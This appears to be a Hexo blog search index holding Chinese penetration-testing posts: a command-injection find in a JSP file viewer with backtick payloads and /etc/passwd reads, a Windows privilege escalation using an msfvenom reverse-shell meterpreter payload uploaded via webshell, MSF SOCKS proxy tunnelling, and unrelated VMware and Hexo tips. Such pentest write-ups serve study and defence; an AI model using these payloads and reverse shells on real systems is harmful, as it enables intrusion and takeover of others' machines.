<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记一次远程命令执行漏洞的挖掘过程]]></title>
    <url>%2F2019%2F07%2F15%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。原文链接： https://www.freebuf.com/vuls/185380.html 前言最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。 发现 通过nessus扫描器的Sitemap模块，发现了可疑目录： 根据sitemap的目录信息，打开URL:http://x.x.x.x:28076/file/，发现存在未授权访问漏洞： 逐个查看里面的文件，找到了一些比较有意思的JSP： 蒙了一下dirFiles.jsp的 参数，发现使用path作为参数名可列出目录、文件信息，URL：http://x.x.x.x:28076/file/dirFiles.jsp?path=. 同样的方法，发现show.jsp存在任意文件读取漏洞，URL：http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd. 结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现logContentNewest.jsp会调用一个bash脚本，便猜想能否使用它构造命令执行： 测试 logContentNewest.jsp正常执行是这样的，可自定义path参数的值，如/etc/passwd，来查找这个文件里面的内容： 分析logContentNewest.jsp和被调用的sh脚本，得知path参数最终会传入sh脚本的FILE_PATH变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断FILE_PATH变量的值是否存在，而这个变量的值目前是可控的 最初想通过添加双引号闭合if条件判断参数注入命令，没有成功payload： /etc/passwd&quot; ];ls;then echo 1;fi;if [ -e &quot;123.txt; 从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能 经过多次测试，最终可用反引号`或者$()进行命令执行，如`ifconfig`payload：&quot;`ifconfig`&quot; 命令结果的回显是因为判断不存在FILA_PATH文件名的文件后，会把变量值返回，其源码如下:echo &quot;the file($FILE_PATH) dose not exist!&quot;拓展知识：Linuxbash中可以使用反引号`、$()等方式将bash命令的执行结果保存到变量中，如a=$(ifconfig) 命令执行结果显示不完整，只能看到返回的第一行的结果，没关系，可以简单优化一下:payload：&quot;`ifconfig |xargs`&quot;拓展知识：xargs可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，xargs可能会误判。简单来说，xargs是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过xargs的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现 再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多… 小结漏洞是由于程序调用bash脚本传参时没有做过滤，通过$(cmd)这样的方式来执行命令并将结果存入变量中，在脚本判断文件不存在时会返回文件名，造成了回显。 漏洞修复方法严格控制文件名参数值，先判断文件名或文件路径是否合法可修复漏洞。]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用BurpSuite宏获取CSRF TOKEN]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN%2F</url>
    <content type="text"><![CDATA[有空再把坑填完 ~]]></content>
  </entry>
  <entry>
    <title><![CDATA[让BurpSuite使用MSF的socks4a代理]]></title>
    <url>%2F2019%2F07%2F11%2F%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。 具体问题演示环境我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。 测试步骤 在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）123msf5 auxiliary(server/socks4a) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set SRVPORT 11080msf5 auxiliary(server/socks4a) &gt; exploit 在配置代理前，我的ip地址是A地公网ip 使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常 这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页 解决方法使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。 步骤 打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址） burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口 打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。 回顾下出口流量走向，如下： 为什么是25378端口 SockScap64支持系统代理 启用系统代理可发现其使用25378端口做代理服务st=>start: 工作机Firefox e=>end: 目标网络 op1=>operation: burp代理（127.0.0.1:1080) op2=>operation: SocksCap64本地代理（127.0.0.1:25378) op3=>operation: ssh本地转发端口（127.0.0.1:1083) op4=>operation: msf socks4a端口（172.16.1.2:11083） st->op1->op2->op3->op4->e{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMware虚拟机导出压缩]]></title>
    <url>%2F2019%2F07%2F11%2FVMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%BC%E5%87%BA%E5%8E%8B%E7%BC%A9%2F</url>
    <content type="text"><![CDATA[先清理系统垃圾文件比如有安装nessus，先删除其插件备份文件： 12rm /opt/nessus/var/nessus/plugins-code.db.1555813621612956655 rm /opt/nessus/var/nessus/plugins-desc.db.15558136311650186018 然后清理swap文件：先执行sync命令，sync命令用于强制被改变的内容立刻写入磁盘，更新超块信息，以防止释放，sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。sync关闭swap：swapoff -a 压缩虚拟机磁盘空间先填充虚拟机磁盘：cat /dev/zero &gt; zero.fill;sync;sleep 1;sync;rm -f zero.fill 使用vm磁盘工具压缩空间 vmware-vdiskmanager.exe -k &quot;G:\vmfiles\Pentest_Linux\Nessus 8_VM12-disk1-cl1.vmdk&quot; 导出为ovf文件 效果原本直接导出大概生成8G大小的文件，压缩后只需不到4G]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次Windows提权过程]]></title>
    <url>%2F2019%2F07%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[通过任意文件上传获取到ASP webshell 生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe 启动监听use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST x.x.x.x set LPORT xx exploit 通过webshell上传并执行木马 msf接收到会话 查看当前用户getuid use incognito list_tokens -u 查找可利用的提权exprun post/multi/recon/local_exploit_suggester 把当前msf回话放到后台，并记住其session值为5bg 利用ms16_075得到system权限]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO建站遇到的几个坑与解决方案]]></title>
    <url>%2F2019%2F07%2F08%2FHEXO%E5%BB%BA%E7%AB%99%E9%81%87%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9D%91%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[本地图片引用npm install hexo-asset-image --save 自动部署到githubnpm install hexo-deployer-git --save 添加流程图支持npm install --save hexo-filter-flowchart安装成功后，需要在根路径的_config.yml文件添加下列代码 1234flowchart: # raphael: # optional, the source url of raphael.js # flowchart: # optional, the source url of flowchart.js options: # options used for `drawSVG` 有空再把坑填完 ~]]></content>
      <categories>
        <category>其它</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[浅谈代理隧道的几种应用场景]]></title>
    <url>%2F2019%2F07%2F08%2F%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%2F</url>
    <content type="text"><![CDATA[前言SOCKS代理隧道HTTP代理隧道代理隧道建立的几种方式代理隧道的几种应用场景 有空再把坑填完 ~]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F05%2Fhello-world%2F</url>
    <content type="text"><![CDATA[这里空空如也 ~]]></content>
  </entry>
</search>
